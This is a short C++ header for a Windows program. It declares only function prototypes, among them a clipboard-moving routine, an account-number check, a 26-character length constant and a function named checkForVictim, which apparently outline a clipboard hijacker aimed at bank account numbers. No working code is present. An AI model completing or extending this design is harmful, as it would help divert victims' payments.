#pragma once
#include <Windows.h>
#include <time.h>

constexpr int MAXL = 26;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
bool init(HINSTANCE hInstance);
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void MoveToCb();
bool CheckIfAccountNumber(LPSTR str);
void checkForVictim();